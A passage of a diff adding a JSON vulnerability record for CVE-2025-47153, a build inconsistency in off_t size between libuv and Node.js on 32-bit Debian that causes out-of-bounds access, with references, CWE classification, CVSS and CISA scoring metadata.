+                "lang": "en",
+                "value": "CWE-1102"
+              }
+            ]
+          }
+        ],
+        "references": [
+          {
+            "url": "https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1076350",
+            "source": "cve@mitre.org"
+          },
+          {
+            "url": "https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=922075",
+            "source": "cve@mitre.org"
+          },
+          {
+            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=892601",
+            "source": "cve@mitre.org"
+          },
+          {
+            "url": "https://github.com/nodejs/node-v0.x-archive/issues/4549",
+            "source": "cve@mitre.org"
+          },
+          {
+            "url": "http://www.openwall.com/lists/oss-security/2025/05/02/2",
+            "source": "af854a3a-2127-422b-91ae-364da2661108"
+          },
+          {
+            "url": "https://lists.debian.org/debian-lts-announce/2025/05/msg00003.html",
+            "source": "af854a3a-2127-422b-91ae-364da2661108"
+          }
+        ]
+      },
+      "mitre": {
+        "dataType": "CVE_RECORD",
+        "cveMetadata": {
+          "state": "PUBLISHED",
+          "cveId": "CVE-2025-47153",
+          "assignerOrgId": "8254265b-2729-46b6-b9e3-3dfca2d5bfca",
+          "assignerShortName": "mitre",
+          "dateUpdated": "2025-05-02T19:02:41.441Z",
+          "dateReserved": "2025-05-01T00:00:00.000Z",
+          "datePublished": "2025-05-01T00:00:00.000Z"
+        },
+        "containers": {
+          "cna": {
+            "affected": [
+              {
+                "collectionURL": "https://packages.debian.org",
+                "defaultStatus": "unknown",
+                "packageName": "nodejs",
+                "platforms": [
+                  "i386"
+                ],
+                "product": "trixie",
+                "vendor": "Debian",
+                "versions": [
+                  {
+                    "lessThanOrEqual": "nodejs_20.19.0+dfsg-2_i386.deb",
+                    "status": "affected",
+                    "version": "nodejs_0.10.0~dfsg1-1_i386.deb",
+                    "versionType": "custom"
+                  }
+                ]
+              }
+            ],
+            "descriptions": [
+              {
+                "lang": "en",
+                "value": "Certain build processes for libuv and Node.js for 32-bit systems, such as for the nodejs binary package through nodejs_20.19.0+dfsg-2_i386.deb for Debian GNU/Linux, have an inconsistent off_t size (e.g., building on i386 Debian always uses _FILE_OFFSET_BITS=64 for the libuv dynamic library, but uses the _FILE_OFFSET_BITS global system default of 32 for nodejs), leading to out-of-bounds access. NOTE: this is not a problem in the Node.js software itself. In particular, the Node.js website's download page does not offer prebuilt Node.js for Linux on i386."
+              }
+            ],
+            "problemTypes": [
+              {
+                "descriptions": [
+                  {
+                    "cweId": "CWE-1102",
+                    "description": "CWE-1102 Reliance on Machine-Dependent Data Representation",
+                    "lang": "en",
+                    "type": "CWE"
+                  }
+                ]
+              }
+            ],
+            "providerMetadata": {
+              "orgId": "8254265b-2729-46b6-b9e3-3dfca2d5bfca",
+              "shortName": "mitre",
+              "dateUpdated": "2025-05-01T17:11:42.151Z"
+            },
+            "references": [
+              {
+                "url": "https://bugzilla.redhat.com/show_bug.cgi?id=892601"
+              },
+              {
+                "url": "https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=922075"
+              },
+              {
+                "url": "https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1076350"
+              },
+              {
+                "url": "https://github.com/nodejs/node-v0.x-archive/issues/4549"
+              }
+            ],
+            "x_generator": {
+              "engine": "enrichogram 0.0.1"
+            },
+            "metrics": [
+              {
+                "cvssV3_1": {
+                  "version": "3.1",
+                  "baseScore": 6.5,
+                  "baseSeverity": "MEDIUM",
+                  "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:L"
+                }
+              }
+            ]
+          },
+          "adp": [
+            {
+              "metrics": [
+                {
+                  "other": {
+                    "type": "ssvc",
+                    "content": {
+                      "timestamp": "2025-05-01T14:42:34.213508Z",
+                      "id": "CVE-2025-47153",
+                      "options": [
+                        {
+                          "Exploitation": "none"
+                        },
+                        {
+                          "Automatable": "no"
+                        },
+                        {
+                          "Technical Impact": "partial"
+                        }
+                      ],
+                      "role": "CISA Coordinator",
+                      "version": "2.0.3"
+                    }
+                  }
+                }
+              ],
+              "title": "CISA ADP Vulnrichment",
+              "providerMetadata": {
+                "orgId": "134c704f-9b21-4f2e-91b3-4a467353bcc0",
+                "shortName": "CISA-ADP",
+                "dateUpdated": "2025-05-01T15:33:48.673Z"
+              }
+            },
+            {
+              "title": "CVE Program Container",
+              "references": [
+                {
+                  "url": "https://lists.debian.org/debian-lts-announce/2025/05/msg00003.html"
+                },
+                {
+                  "url": "http://www.openwall.com/lists/oss-security/2025/05/02/2"
+                }
+              ],
+              "providerMetadata": {
+                "orgId": "af854a3a-2127-422b-91ae-364da2661108",
+                "shortName": "CVE",
+                "dateUpdated": "2025-05-02T19:02:41.441Z"
+              }
+            }
+          ]
+        },
+        "dataVersion": "5.1"
+      },
+      "github_repository_security_advisory": null
+    }
+  ]
+}
